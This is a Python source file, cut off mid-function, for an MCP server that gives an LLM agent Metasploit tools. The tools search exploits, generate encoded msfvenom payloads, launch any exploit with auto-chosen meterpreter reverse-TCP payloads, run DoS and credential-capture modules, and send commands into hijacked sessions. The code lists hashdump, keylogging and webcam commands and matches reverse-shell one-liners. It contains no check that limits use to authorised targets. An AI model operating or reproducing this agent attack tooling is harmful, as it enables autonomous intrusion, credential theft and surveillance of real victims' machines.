#             logger.info(f"Found {count} exploits matching '{search_term}'. Returning max {limit}.")
#             return filtered_exploits[:limit]
#         else:
#             limit = 100
#             logger.info(f"No search term provided, returning first {limit} exploits.")
#             return exploits[:limit]
#     except asyncio.TimeoutError:
#         error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) while listing exploits from Metasploit server. Server may be slow or unresponsive."
#         logger.error(error_msg)
#         return [f"Error: {error_msg}"]
#     except MsfRpcError as e:
#         logger.error(f"Metasploit RPC error while listing exploits: {e}")
#         return [f"Error: Metasploit RPC error: {e}"]
#     except Exception as e:
#         logger.exception("Unexpected error listing exploits.")
#         return [f"Error: Unexpected error listing exploits: {e}"]

# NUEVA FUNCIÓN - Busca en metadatos completos (nombre, descripción, plataformas, CVE, etc.)
async def list_exploits(search_term: str = "") -> List[str]:
    """
    List available Metasploit exploits, optionally filtered by search term.

    Searches in exploit names, descriptions, target platforms, CVEs, and other metadata.
    This allows finding exploits by OS version (e.g., "Windows 7", "Windows Server 2008").

    IMPORTANT: When this tool returns results, you MUST display the exploit list to the user.
    Do NOT just mention that exploits were found - show the actual list of exploit names.
    The user needs to see the exploit paths to choose which one to use.

    Args:
        search_term: Optional term to filter exploits. Searches in all metadata fields.

    Returns:
        List of exploit names matching the term (max 200), or top 100 if no term.
    """
    client = get_msf_client()
    logger.info(f"Listing exploits (search term: '{search_term or 'None'}')")
    try:
        if search_term:
            # Use search() method which searches in metadata (description, platforms, CVE, etc.)
            logger.debug(f"Calling client.modules.search with {RPC_CALL_TIMEOUT}s timeout...")
            search_results = await asyncio.wait_for(
                asyncio.to_thread(lambda: client.modules.search(search_term)),
                timeout=RPC_CALL_TIMEOUT
            )

            # search_results is a list of module dictionaries
            # Filter only exploit type modules and extract their fullnames
            filtered_exploits = [
                m.get('fullname') for m in search_results
                if m and m.get('type') == 'exploit' and m.get('fullname')
            ]

            count = len(filtered_exploits)
            limit = 200
            logger.info(f"Found {count} exploits matching '{search_term}'. Returning max {limit}.")

            # Return with context header for better LLM understanding
            if count == 0:
                return [f"No exploits found for search term: {search_term}"]

            result = [f"Found {count} exploits matching '{search_term}' (showing first {min(count, limit)}):"]
            result.extend(filtered_exploits[:limit])
            return result
        else:
            # No search term - list all exploits
            logger.debug(f"Calling client.modules.exploits with {RPC_CALL_TIMEOUT}s timeout...")
            exploits = await asyncio.wait_for(
                asyncio.to_thread(lambda: client.modules.exploits),
                timeout=RPC_CALL_TIMEOUT
            )
            limit = 100
            logger.info(f"No search term provided, returning first {limit} exploits.")
            return exploits[:limit]

    except asyncio.TimeoutError:
        error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) while listing exploits from Metasploit server. Server may be slow or unresponsive."
        logger.error(error_msg)
        return [f"Error: {error_msg}"]
    except MsfRpcError as e:
        logger.error(f"Metasploit RPC error while listing exploits: {e}")
        return [f"Error: Metasploit RPC error: {e}"]
    except Exception as e:
        logger.exception("Unexpected error listing exploits.")
        return [f"Error: Unexpected error listing exploits: {e}"]

@mcp.tool()
async def list_payloads(platform: str = "", arch: str = "") -> List[str]:
    """
    List available Metasploit payloads, optionally filtered by platform and/or architecture.

    Args:
        platform: Optional platform filter (e.g., 'windows', 'linux', 'python', 'php').
        arch: Optional architecture filter (e.g., 'x86', 'x64', 'cmd', 'meterpreter').

    Returns:
        List of payload names matching filters (max 100).
    """
    client = get_msf_client()
    logger.info(f"Listing payloads (platform: '{platform or 'Any'}', arch: '{arch or 'Any'}')")
    try:
        # Add timeout to prevent hanging on slow/unresponsive MSF server
        logger.debug(f"Calling client.modules.payloads with {RPC_CALL_TIMEOUT}s timeout...")
        payloads = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.modules.payloads),
            timeout=RPC_CALL_TIMEOUT
        )
        logger.debug(f"Retrieved {len(payloads)} total payloads from MSF.")
        filtered = payloads
        if platform:
            plat_lower = platform.lower()
            # Match platform at the start of the payload path segment or within common paths
            filtered = [p for p in filtered if p.lower().startswith(plat_lower + '/') or f"/{plat_lower}/" in p.lower()]
        if arch:
            arch_lower = arch.lower()
            # Match architecture more flexibly (e.g., '/x64/', 'meterpreter')
            filtered = [p for p in filtered if f"/{arch_lower}/" in p.lower() or arch_lower in p.lower().split('/')]

        count = len(filtered)
        limit = 100
        logger.info(f"Found {count} payloads matching filters. Returning max {limit}.")
        return filtered[:limit]
    except asyncio.TimeoutError:
        error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) while listing payloads from Metasploit server. Server may be slow or unresponsive."
        logger.error(error_msg)
        return [f"Error: {error_msg}"]
    except MsfRpcError as e:
        logger.error(f"Metasploit RPC error while listing payloads: {e}")
        return [f"Error: Metasploit RPC error: {e}"]
    except Exception as e:
        logger.exception("Unexpected error listing payloads.")
        return [f"Error: Unexpected error listing payloads: {e}"]

@mcp.tool()
async def generate_payload(
    payload_type: str,
    format_type: str,
    options: Union[Dict[str, Any], str], # Required: e.g., {"LHOST": "1.2.3.4", "LPORT": 4444} or "LHOST=1.2.3.4,LPORT=4444"
    encoder: Optional[str] = None,
    iterations: int = 0,
    bad_chars: str = "",
    nop_sled_size: int = 0,
    template_path: Optional[str] = None,
    keep_template: bool = False,
    force_encode: bool = False,
    output_filename: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Generate a Metasploit payload using the RPC API (payload.generate).
    Saves the generated payload to a file on the server if successful.

    Args:
        payload_type: Type of payload (e.g., windows/meterpreter/reverse_tcp).
        format_type: Output format (raw, exe, python, etc.).
        options: Dictionary of required payload options (e.g., {"LHOST": "1.2.3.4", "LPORT": 4444})
                or string format "LHOST=1.2.3.4,LPORT=4444". Prefer dict format.
        encoder: Optional encoder to use.
        iterations: Optional number of encoding iterations.
        bad_chars: Optional string of bad characters to avoid (e.g., '\\x00\\x0a\\x0d').
        nop_sled_size: Optional size of NOP sled.
        template_path: Optional path to an executable template.
        keep_template: Keep the template working (requires template_path).
        force_encode: Force encoding even if not needed by bad chars.
        output_filename: Optional desired filename (without path). If None, a default name is generated.

    Returns:
        Dictionary containing status, message, payload size/info, and server-side save path.
    """
    client = get_msf_client()
    logger.info(f"Generating payload '{payload_type}' (Format: {format_type}) via RPC. Options: {options}")

    # Parse options gracefully
    try:
        parsed_options = _parse_options_gracefully(options)
    except ValueError as e:
        return {"status": "error", "message": f"Invalid options format: {e}"}

    if not parsed_options:
        return {"status": "error", "message": "Payload 'options' dictionary (e.g., LHOST, LPORT) is required."}

    try:
        # Generate the payload using msfvenom (direct command-line method)
        logger.info("Generating payload using msfvenom...")

        try:
            # Build msfvenom command
            msfvenom_cmd = ['msfvenom', '-p', payload_type, '-f', format_type]

            # Add payload options
            for key, value in parsed_options.items():
                msfvenom_cmd.append(f"{key}={value}")

            # Add encoding options if specified
            if encoder:
                msfvenom_cmd.extend(['-e', encoder])
            if iterations > 0:
                msfvenom_cmd.extend(['-i', str(iterations)])
            if bad_chars:
                msfvenom_cmd.extend(['-b', bad_chars])
            if nop_sled_size > 0:
                msfvenom_cmd.extend(['-n', str(nop_sled_size)])
            if template_path:
                msfvenom_cmd.extend(['-x', template_path])
                if keep_template:
                    msfvenom_cmd.append('-k')
            if force_encode:
                msfvenom_cmd.append('--force-encode')

            logger.info(f"Executing msfvenom command: {' '.join(msfvenom_cmd)}")

            # Run msfvenom with sudo to ensure permissions
            result = await asyncio.to_thread(
                lambda: subprocess.run(
                    ['sudo'] + msfvenom_cmd,
                    capture_output=True,
                    timeout=120  # 2 minutes timeout for encoding
                )
            )

            if result.returncode != 0:
                error_output = result.stderr.decode('utf-8', errors='replace')
                logger.error(f"msfvenom failed (exit code {result.returncode}): {error_output}")
                return {
                    "status": "error",
                    "message": f"Payload generation failed: {error_output[:500]}"
                }

            raw_payload_bytes = result.stdout

            if not raw_payload_bytes or len(raw_payload_bytes) == 0:
                return {
                    "status": "error",
                    "message": "Payload generation produced empty output. Check msfvenom command and options."
                }

            logger.info(f"Payload generated successfully via msfvenom ({len(raw_payload_bytes)} bytes)")

        except subprocess.TimeoutExpired:
            return {"status": "error", "message": "Payload generation timed out after 120 seconds"}
        except FileNotFoundError:
            return {"status": "error", "message": "msfvenom command not found. Ensure Metasploit Framework is installed and in PATH."}
        except Exception as e:
            logger.exception(f"Unexpected error during msfvenom generation: {e}")
            return {
                "status": "error",
                "message": f"Payload generation failed with error: {str(e)}"
            }

        if not isinstance(raw_payload_bytes, bytes):
            error_msg = f"Payload generation failed. Expected bytes, got {type(raw_payload_bytes)}"
            logger.error(error_msg)
            return {"status": "error", "message": error_msg}

        payload_size = len(raw_payload_bytes)
        logger.info(f"Payload generation successful. Size: {payload_size} bytes.")

        # --- Save Payload ---
        # Ensure directory exists
        try:
            os.makedirs(PAYLOAD_SAVE_DIR, exist_ok=True)
            logger.debug(f"Ensured payload directory exists: {PAYLOAD_SAVE_DIR}")
        except OSError as e:
            logger.error(f"Failed to create payload save directory {PAYLOAD_SAVE_DIR}: {e}")
            return {
                "status": "error",
                "message": f"Payload generated ({payload_size} bytes) but could not create save directory: {e}",
                "payload_size": payload_size, "format": format_type
            }

        # Determine filename (with basic sanitization)
        final_filename = None
        if output_filename:
            sanitized = re.sub(r'[^a-zA-Z0-9_.\-]', '_', os.path.basename(output_filename)) # Basic sanitize + basename
            if sanitized: final_filename = sanitized

        if not final_filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_payload_type = re.sub(r'[^a-zA-Z0-9_]', '_', payload_type)
            safe_format = re.sub(r'[^a-zA-Z0-9_]', '_', format_type)
            final_filename = f"payload_{safe_payload_type}_{timestamp}.{safe_format}"

        save_path = os.path.join(PAYLOAD_SAVE_DIR, final_filename)

        # Write payload to file
        try:
            with open(save_path, "wb") as f:
                f.write(raw_payload_bytes)
            logger.info(f"Payload saved to {save_path}")
            return {
                "status": "success",
                "message": f"Payload '{payload_type}' generated successfully and saved.",
                "payload_size": payload_size,
                "format": format_type,
                "server_save_path": save_path
            }
        except IOError as e:
            logger.error(f"Failed to write payload to {save_path}: {e}")
            return {
                "status": "error",
                "message": f"Payload generated but failed to save to file: {e}",
                "payload_size": payload_size, "format": format_type
            }

    except (ValueError, MsfRpcError) as e: # Catches errors from _get_module_object, _set_module_options
        error_str = str(e).lower()
        logger.error(f"Error generating payload {payload_type}: {e}")
        if "invalid payload type" in error_str or "unknown module" in error_str:
             return {"status": "error", "message": f"Invalid payload type: {payload_type}"}
        elif "missing required option" in error_str or "invalid option" in error_str:
             missing = getattr(Payload, 'missing_required', []) if 'payload' in locals() else []
             return {"status": "error", "message": f"Missing/invalid options for payload {payload_type}: {e}", "missing_required": missing}
        return {"status": "error", "message": f"Error generating payload: {e}"}
    except AttributeError as e: # Specifically catch if payload_generate is missing
        logger.exception(f"AttributeError during payload generation for '{payload_type}': {e}")
        if "object has no attribute 'payload_generate'" in str(e):
            return {"status": "error", "message": f"The pymetasploit3 payload module doesn't have the payload_generate method. Please check library version/compatibility."}
        return {"status": "error", "message": f"An attribute error occurred: {e}"}
    except Exception as e:
        logger.exception(f"Unexpected error during payload generation for '{payload_type}'.")
        return {"status": "error", "message": f"An unexpected server error occurred during payload generation: {e}"}


# ============================================================================
# HELPER FUNCTIONS FOR INTELLIGENT EXPLOIT EXECUTION
# ============================================================================

async def _detect_target_os(target_ip: str) -> Optional[str]:
    """
    Detect target OS by TTL analysis using ping.

    Returns:
        'windows', 'linux', or None if detection fails
    """
    try:
        logger.info(f"[OS_DETECT] Attempting to detect OS for {target_ip} via ping...")

        # Try ping with 1 packet, 2 second timeout
        proc = await asyncio.create_subprocess_exec(
            'ping', '-c', '1', '-W', '2', target_ip,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=5.0)
        output = stdout.decode('utf-8', errors='ignore')

        # Extract TTL value
        ttl_match = re.search(r'ttl=(\d+)', output, re.IGNORECASE)
        if not ttl_match:
            logger.warning(f"[OS_DETECT] Could not extract TTL from ping output")
            return None

        ttl = int(ttl_match.group(1))
        logger.info(f"[OS_DETECT] Detected TTL={ttl} for {target_ip}")

        # TTL-based OS detection
        # Windows: TTL=128 (range 120-130)
        # Linux: TTL=64 (range 60-65)
        if 120 <= ttl <= 130:
            logger.info(f"[OS_DETECT] ✓ Detected OS: Windows (TTL={ttl})")
            return 'windows'
        elif 60 <= ttl <= 65:
            logger.info(f"[OS_DETECT] ✓ Detected OS: Linux (TTL={ttl})")
            return 'linux'
        else:
            logger.warning(f"[OS_DETECT] TTL={ttl} doesn't match common patterns")
            return None

    except asyncio.TimeoutError:
        logger.warning(f"[OS_DETECT] Ping timeout for {target_ip}")
        return None
    except Exception as e:
        logger.error(f"[OS_DETECT] Error detecting OS: {e}")
        return None


def _suggest_payload(exploit_name: str, target_os: Optional[str], arch: str = "x64") -> str:
    """
    Suggest best payload based on exploit name and target OS.

    Args:
        exploit_name: Full exploit module name (e.g., 'windows/smb/ms17_010_eternalblue')
        target_os: Detected OS ('windows', 'linux', or None)
        arch: Target architecture ('x86', 'x64', default 'x64')

    Returns:
        Recommended payload name
    """
    exploit_lower = exploit_name.lower()

    # If OS is detected from exploit path, use that
    if not target_os:
        if 'windows' in exploit_lower:
            target_os = 'windows'
        elif 'linux' in exploit_lower or 'unix' in exploit_lower:
            target_os = 'linux'

    logger.info(f"[PAYLOAD_SUGGEST] Exploit: {exploit_name}, OS: {target_os}, Arch: {arch}")

    # Windows payloads
    if target_os == 'windows':
        if arch == 'x64':
            payload = "windows/x64/meterpreter/reverse_tcp"
        else:
            payload = "windows/meterpreter/reverse_tcp"
        logger.info(f"[PAYLOAD_SUGGEST] ✓ Suggested Windows payload: {payload}")
        return payload

    # Linux payloads
    elif target_os == 'linux':
        if arch == 'x64':
            payload = "linux/x64/meterpreter/reverse_tcp"
        else:
            payload = "linux/x86/meterpreter/reverse_tcp"
        logger.info(f"[PAYLOAD_SUGGEST] ✓ Suggested Linux payload: {payload}")
        return payload

    # Generic fallback - try to infer from exploit name
    else:
        logger.warning(f"[PAYLOAD_SUGGEST] OS unknown, inferring from exploit name...")
        if 'windows' in exploit_lower:
            payload = "windows/x64/meterpreter/reverse_tcp"
        elif 'linux' in exploit_lower or 'unix' in exploit_lower:
            payload = "linux/x64/meterpreter/reverse_tcp"
        else:
            # Ultimate fallback - generic cmd payload
            payload = "cmd/unix/reverse"
            logger.warning(f"[PAYLOAD_SUGGEST] ⚠ Using generic fallback payload: {payload}")
            return payload

        logger.info(f"[PAYLOAD_SUGGEST] ✓ Inferred payload from exploit name: {payload}")
        return payload


def _get_required_options_for_exploit(exploit_name: str) -> List[str]:
    """
    Return list of required options that must be provided for an exploit.

    Common required options:
    - RHOSTS: Target IP/range (almost always required)
    - RPORT: Target port (often has defaults)
    - LHOST: Local IP for reverse connection (for reverse payloads)
    - LPORT: Local port for reverse connection
    """
    # Most exploits require RHOSTS
    required = ['RHOSTS']

    exploit_lower = exploit_name.lower()

    # Service-specific ports (will use defaults if not specified)
    # These are usually not "required" as they have defaults, but good to know

    return required


@mcp.tool()
async def run_exploit(
    module_name: str,
    target_host: str,
    lhost: str = "192.168.56.1",
    lport: int = 4444,
    payload_name: Optional[str] = None,
    additional_options: Optional[Dict[str, Any]] = None,
    auto_detect_os: bool = True
) -> Dict[str, Any]:
    """
    Execute ANY Metasploit exploit with intelligent payload selection and robust session handling.

    This tool works like run_exploit_eternalblue but for ANY exploit:
    - Automatic OS detection via TTL analysis
    - Intelligent payload selection based on target OS
    - Robust session verification with 20 retries
    - Extended timeout for stage delivery
    - Execution via console (synchronous) for reliable session tracking

    Args:
        module_name: Exploit module name (e.g., 'windows/smb/psexec', 'linux/http/apache_mod_cgi_bash_env_exec')
        target_host: Target machine IP address (REQUIRED)
        lhost: Local IP for reverse connection (default: 192.168.56.1)
        lport: Local port for reverse connection (default: 4444)
        payload_name: Specific payload to use (optional - will auto-select if not provided)
        additional_options: Extra exploit options like SMBUser, SMBPass, RPORT, etc.
        auto_detect_os: Automatically detect target OS via ping TTL (default: True)

    Returns:
        Dictionary with exploit results including session ID if successful

    Example:
        # PSExec against Windows
        run_exploit(
            module_name="windows/smb/psexec",
            target_host="192.168.56.6",
            additional_options={"SMBUser": "admin", "SMBPass": "password123"}
        )

        # Apache Bash CGI against Linux
        run_exploit(
            module_name="linux/http/apache_mod_cgi_bash_env_exec",
            target_host="192.168.56.10",
            additional_options={"TARGETURI": "/cgi-bin/status"}
        )
    """
    logger.info(f"[RUN_EXPLOIT] ============================================")
    logger.info(f"[RUN_EXPLOIT] Executing exploit: {module_name}")
    logger.info(f"[RUN_EXPLOIT] Target: {target_host}, LHOST: {lhost}, LPORT: {lport}")
    logger.info(f"[RUN_EXPLOIT] ============================================")

    # Step 1: Auto-detect target OS if enabled
    detected_os = None
    if auto_detect_os:
        logger.info(f"[RUN_EXPLOIT] Step 1: Auto-detecting target OS...")
        detected_os = await _detect_target_os(target_host)
        if detected_os:
            logger.info(f"[RUN_EXPLOIT] ✓ OS Detection: {detected_os.upper()}")
        else:
            logger.warning(f"[RUN_EXPLOIT] ⚠ OS Detection failed, will infer from exploit name")
    else:
        logger.info(f"[RUN_EXPLOIT] Step 1: OS auto-detection disabled, inferring from exploit name")

    # Step 2: Select appropriate payload
    if not payload_name:
        logger.info(f"[RUN_EXPLOIT] Step 2: Auto-selecting payload...")
        payload_name = _suggest_payload(module_name, detected_os, arch="x64")
        logger.info(f"[RUN_EXPLOIT] ✓ Selected payload: {payload_name}")
    else:
        logger.info(f"[RUN_EXPLOIT] Step 2: Using provided payload: {payload_name}")

    # Step 3: Build exploit options
    logger.info(f"[RUN_EXPLOIT] Step 3: Configuring exploit options...")
    exploit_options = {"RHOSTS": target_host}

    # Merge additional options
    if additional_options:
        exploit_options.update(additional_options)
        logger.info(f"[RUN_EXPLOIT] ✓ Additional options: {list(additional_options.keys())}")

    # Step 4: Build payload options
    payload_options = {
        "LHOST": lhost,
        "LPORT": lport
    }

    payload_spec = {
        "name": payload_name,
        "options": payload_options
    }

    logger.info(f"[RUN_EXPLOIT] ✓ Exploit options: {exploit_options}")
    logger.info(f"[RUN_EXPLOIT] ✓ Payload options: {payload_options}")

    # Step 5: Execute exploit via console (synchronous for reliable session tracking)
    logger.info(f"[RUN_EXPLOIT] Step 4: Executing exploit via console...")
    logger.info(f"[RUN_EXPLOIT] Using EXTENDED timeout (300s) for stage delivery and session setup...")

    result = await _execute_module_console(
        module_type='exploit',
        module_name=module_name,
        module_options=exploit_options,
        command='exploit',
        payload_spec=payload_spec,
        timeout=300  # 5 minutes - same as EternalBlue
    )

    # Step 6: Add metadata for debugging
    result["tool_used"] = "run_exploit"
    result["auto_configured"] = True
    result["config"] = {
        "exploit": module_name,
        "payload": payload_name,
        "target_host": target_host,
        "lhost": lhost,
        "lport": lport,
        "detected_os": detected_os,
        "additional_options": additional_options or {}
    }

    logger.info(f"[RUN_EXPLOIT] ============================================")
    logger.info(f"[RUN_EXPLOIT] Execution completed with status: {result.get('status')}")
    logger.info(f"[RUN_EXPLOIT] ============================================")

    # Step 7: Log console output for debugging
    module_output = result.get('module_output', '')
    if module_output:
        logger.info(f"[RUN_EXPLOIT] === CONSOLE OUTPUT (first 50 lines) ===")
        for line in module_output.split('\n')[:50]:
            if line.strip():
                logger.info(f"[RUN_EXPLOIT OUTPUT] {line}")
        if len(module_output.split('\n')) > 50:
            logger.info(f"[RUN_EXPLOIT OUTPUT] ... ({len(module_output.split('\n')) - 50} more lines)")
        logger.info(f"[RUN_EXPLOIT] === END CONSOLE OUTPUT ===")

    # Step 8: Report session status
    if result.get('session_id_detected'):
        logger.info(f"[RUN_EXPLOIT] ✓ Session detected in output: #{result.get('session_id_detected')}")
        if result.get('session_verified'):
            logger.info(f"[RUN_EXPLOIT] ✓ Session VERIFIED and ready to use")
        else:
            logger.warning(f"[RUN_EXPLOIT] ⚠ Session detected but NOT verified - may be unstable")
    else:
        logger.warning(f"[RUN_EXPLOIT] ✗ No session detected in output")

    # Step 9: Manual session check as fallback
    try:
        client = get_msf_client()
        all_sessions = await asyncio.to_thread(lambda: client.sessions.list)
        logger.info(f"[RUN_EXPLOIT] Manual session check: Found {len(all_sessions)} total active session(s)")
        if all_sessions:
            for sid, sinfo in all_sessions.items():
                session_type = sinfo.get('type', 'unknown') if isinstance(sinfo, dict) else 'unknown'
                logger.info(f"[RUN_EXPLOIT] Active session: #{sid}, type={session_type}")
    except Exception as e:
        logger.error(f"[RUN_EXPLOIT] Error checking sessions manually: {e}")

    return result


@mcp.tool()
async def run_auxiliary_module(
    module_name: str,
    options: Dict[str, Any],
    timeout_seconds: int = 180
) -> Dict[str, Any]:
    """
    Execute ANY Metasploit auxiliary module with full flexibility.

    This tool works for ALL auxiliary modules:
    - Scanners: port scanners, service enumeration, vulnerability detection
    - Discovery: host discovery, ARP sweep, network mapping
    - Admin: remote command execution, service management
    - DoS: denial of service modules
    - Fuzzing: protocol fuzzers
    - Server: listeners, capture modules
    - Gather: credential harvesting, information gathering

    IMPORTANT: Module names DO NOT include 'auxiliary/' prefix - just use the path after it.

    Args:
        module_name: Auxiliary module name WITHOUT 'auxiliary/' prefix
                    Examples:
                    - 'scanner/portscan/tcp' (NOT 'auxiliary/scanner/portscan/tcp')
                    - 'scanner/discovery/arp_sweep'
                    - 'scanner/smb/smb_version'
                    - 'admin/smb/psexec_command'
                    - 'server/capture/http'
        options: Dictionary of module options (required options depend on the module)
                Common options:
                - RHOSTS: Target IP/range (for scanners)
                - RHOST: Single target IP (for admin/specific modules)
                - PORTS: Port range (for port scanners)
                - THREADS: Concurrent threads
                - USERNAME/PASSWORD: Credentials
                - SMBUser/SMBPass: SMB credentials
                - COMMAND: Command to execute
        timeout_seconds: Max execution time (default: 180s = 3 minutes)

    Returns:
        Dictionary with module execution results and output

    Examples:
        # ARP discovery scan
        run_auxiliary_module(
            module_name="scanner/discovery/arp_sweep",
            options={"RHOSTS": "192.168.56.0/24"}
        )

        # Port scan with custom settings
        run_auxiliary_module(
            module_name="scanner/portscan/tcp",
            options={"RHOSTS": "192.168.56.6", "PORTS": "1-1000", "THREADS": 10}
        )

        # SMB version detection
        run_auxiliary_module(
            module_name="scanner/smb/smb_version",
            options={"RHOSTS": "192.168.56.0/24"}
        )

        # Execute remote command via PSExec
        run_auxiliary_module(
            module_name="admin/smb/psexec_command",
            options={
                "RHOST": "192.168.56.6",
                "SMBUser": "admin",
                "SMBPass": "password",
                "COMMAND": "whoami"
            }
        )

        # Start HTTP credential capture server
        run_auxiliary_module(
            module_name="server/capture/http",
            options={"SRVPORT": 8080}
        )
    """
    logger.info(f"[RUN_AUXILIARY] ============================================")
    logger.info(f"[RUN_AUXILIARY] Executing auxiliary module: {module_name}")
    logger.info(f"[RUN_AUXILIARY] Options: {options}")
    logger.info(f"[RUN_AUXILIARY] ============================================")

    # Use options directly (full flexibility)
    module_options = options or {}

    logger.info(f"[RUN_AUXILIARY] ✓ Module options: {module_options}")

    # Execute auxiliary module via console (synchronous for reliable output)
    logger.info(f"[RUN_AUXILIARY] Executing module via console...")
    logger.info(f"[RUN_AUXILIARY] Timeout: {timeout_seconds}s")

    result = await _execute_module_console(
        module_type='auxiliary',
        module_name=module_name,
        module_options=module_options,
        command='run',
        timeout=timeout_seconds
    )

    # Add metadata
    result["tool_used"] = "run_auxiliary_module"
    result["config"] = {
        "module": module_name,
        "options": module_options,
        "timeout_seconds": timeout_seconds
    }

    logger.info(f"[RUN_AUXILIARY] ============================================")
    logger.info(f"[RUN_AUXILIARY] Execution completed with status: {result.get('status')}")
    logger.info(f"[RUN_AUXILIARY] ============================================")

    # Log console output for debugging
    module_output = result.get('module_output', '')
    if module_output:
        logger.info(f"[RUN_AUXILIARY] === CONSOLE OUTPUT (first 100 lines) ===")
        for line in module_output.split('\n')[:100]:
            if line.strip():
                logger.info(f"[RUN_AUXILIARY OUTPUT] {line}")
        if len(module_output.split('\n')) > 100:
            logger.info(f"[RUN_AUXILIARY OUTPUT] ... ({len(module_output.split('\n')) - 100} more lines)")
        logger.info(f"[RUN_AUXILIARY] === END CONSOLE OUTPUT ===")

    return result

@mcp.tool()
async def list_active_sessions() -> Dict[str, Any]:
    """List active Metasploit sessions with their details."""
    client = get_msf_client()
    logger.info("Listing active Metasploit sessions.")
    try:
        logger.debug(f"Calling client.sessions.list with {RPC_CALL_TIMEOUT}s timeout...")
        sessions_dict = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.sessions.list),
            timeout=RPC_CALL_TIMEOUT
        )
        if not isinstance(sessions_dict, dict):
            logger.error(f"Expected dict from sessions.list, got {type(sessions_dict)}")
            return {"status": "error", "message": f"Unexpected data type for sessions list: {type(sessions_dict)}"}

        logger.info(f"Found {len(sessions_dict)} active sessions.")
        # Ensure keys are strings for consistent JSON
        sessions_dict_str_keys = {str(k): v for k, v in sessions_dict.items()}
        return {"status": "success", "sessions": sessions_dict_str_keys, "count": len(sessions_dict_str_keys)}
    except asyncio.TimeoutError:
        error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) while listing sessions from Metasploit server. Server may be slow or unresponsive."
        logger.error(error_msg)
        return {"status": "error", "message": error_msg}
    except MsfRpcError as e:
        logger.error(f"Metasploit RPC error while listing sessions: {e}")
        return {"status": "error", "message": f"Metasploit RPC error: {e}"}
    except Exception as e:
        logger.exception("Unexpected error listing sessions.")
        return {"status": "error", "message": f"Unexpected error listing sessions: {e}"}

@mcp.tool()
async def send_session_command(
    session_id: int,
    command: str,
    timeout_seconds: int = SESSION_COMMAND_TIMEOUT,
) -> Dict[str, Any]:
    """
    Execute a command in an active Metasploit session.

    IMPORTANT FOR LLM AGENTS:
    - For Meterpreter sessions, this tool AUTOMATICALLY handles entering shell mode for OS commands
    - You can send Windows/Linux commands directly (cd, echo, mkdir, ls, etc.)
    - For Meterpreter-native commands (sysinfo, getuid, download, upload), use those directly
    - The tool will detect the command type and handle shell transitions automatically

    EXAMPLES:
    - Create file: send_session_command(1, "echo test > C:\\Users\\Public\\file.txt")
    - List directory: send_session_command(1, "dir C:\\Windows\\Temp")
    - Get system info: send_session_command(1, "sysinfo")  # Meterpreter command

    The command will be executed and output returned. If timeout occurs, the command may still
    be running - check the session manually or retry with longer timeout.

    Args:
        session_id: ID of the target session (get from exploit result or list_active_sessions)
        command: Command to execute (OS shell command or Meterpreter command)
        timeout_seconds: Maximum wait time in seconds (default: 60s)

    Returns:
        Dictionary with:
        - status: 'success', 'timeout', or 'error'
        - message: Human-readable result description
        - output: Command output (empty if timeout/error)
        - command_type: 'shell' or 'meterpreter' (indicates how command was executed)
    """
    client = get_msf_client()
    logger.info(f"Sending command to session {session_id}: '{command}'")
    session_id_str = str(session_id)

    # Define Meterpreter-native commands
    METERPRETER_COMMANDS = {
        'sysinfo', 'getuid', 'getpid', 'ps', 'shell', 'background', 'exit',
        'download', 'upload', 'cd', 'pwd', 'ls', 'cat', 'rm', 'mkdir', 'rmdir',
        'execute', 'migrate', 'getprivs', 'getsystem', 'hashdump', 'run',
        'load', 'use', 'sessions', 'resource', 'route', 'screenshot',
        'webcam_snap', 'webcam_stream', 'record_mic', 'keyscan_start', 'keyscan_dump'
    }

    # Detect if command is OS shell command or Meterpreter command
    command_base = command.strip().split()[0].lower() if command.strip() else ""
    is_os_shell_command = command_base not in METERPRETER_COMMANDS and any([
        '\\' in command,  # Windows paths
        '/' in command and not command.startswith('/'),  # Unix paths
        '>' in command or '<' in command,  # Redirection
        '|' in command or '&&' in command,  # Pipes/chaining
        command_base in {'echo', 'type', 'more', 'find', 'findstr', 'tasklist', 'netstat', 'ipconfig', 'whoami', 'hostname', 'powershell', 'cmd'},  # Common Windows + shells
        command_base in {'grep', 'awk', 'sed', 'curl', 'wget', 'tail', 'head', 'chmod', 'chown', 'uname', 'ifconfig', 'ping', 'bash', 'sh'}  # Common Linux + shells
    ])

    logger.info(f"Command '{command_base}' classified as: {'OS shell' if is_os_shell_command else 'Meterpreter'}")

    # Detectar comandos fire-and-forget (reverse shells / conexiones persistentes que nunca retornan)
    is_fire_and_forget = is_os_shell_command and (
        ('tcpclient' in command.lower() and 'powershell' in command.lower()) or
        ('/dev/tcp' in command and 'bash' in command.lower()) or
        ('System.Net.Sockets' in command)
    )
    if is_fire_and_forget:
        logger.info("Command classified as fire-and-forget (persistent connection / reverse shell)")

    try:
        # --- Get Session Info and Object ---
        current_sessions = await asyncio.to_thread(lambda: client.sessions.list)
        if session_id_str not in current_sessions:
            logger.error(f"Session {session_id} not found.")
            return {"status": "error", "message": f"Session {session_id} not found."}

        session_info = current_sessions[session_id_str]
        session_type = session_info.get('type', 'unknown').lower() if isinstance(session_info, dict) else 'unknown'
        logger.debug(f"Session {session_id} type: {session_type}")

        session = await asyncio.to_thread(lambda: client.sessions.session(session_id_str))
        if not session:
            logger.error(f"Failed to get session object for existing session {session_id}.")
            return {"status": "error", "message": f"Error retrieving session {session_id} object."}

        # --- Execute Command Based on Type ---
        output = ""
        status = "error" # Default status
        message = "Command execution failed or type unknown."
        command_type = "unknown"  # Inicializar al inicio para evitar problemas

        if session_type == 'meterpreter':
            if session_shell_type.get(session_id_str) is None:
                session_shell_type[session_id_str] = 'meterpreter'

            logger.debug(f"Using session.run_with_output for Meterpreter session {session_id}")
            command_type = "meterpreter"  # Default

            try:
                # AUTOMATIC SHELL TRANSITION FOR OS COMMANDS
                if is_os_shell_command:
                    logger.info(f"OS shell command detected, ensuring shell mode is active...")
                    command_type = "shell"

                    # --- PATH A: Fire-and-forget (reverse shells / conexiones persistentes) ---
                    if is_fire_and_forget:
                        logger.info("Fire-and-forget path: reverse shell one-liner detectado.")
                        if session_shell_type[session_id_str] == 'meterpreter':
